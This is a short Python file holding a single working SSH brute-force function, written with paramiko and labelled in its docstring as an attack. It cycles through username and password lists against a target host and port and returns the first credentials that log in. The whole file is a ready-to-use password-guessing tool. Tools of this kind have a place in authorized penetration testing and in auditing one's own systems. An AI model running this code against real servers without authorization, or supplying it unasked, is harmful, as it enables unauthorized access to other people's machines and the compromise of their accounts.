import paramiko

def brute_force_ssh(target, port, usernames, passwords):
    """Performs SSH brute-force attack dynamically."""
    
    ssh = None  

    for username in usernames:
        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, port=port, username=username, password=password, timeout=3)
                ssh.close()
                return f"✅ Successful login -> {username}:{password}"
            except paramiko.AuthenticationException:
                continue  # Wrong credentials, try next
            except paramiko.SSHException as e:
                return f"⚠️ SSH error: {e}"
            except Exception as e:
                return f"⚠️ Unexpected error: {e}"
            finally:
                if ssh is not None:  
                    ssh.close()

    return "🔒 Brute force failed. No credentials matched."
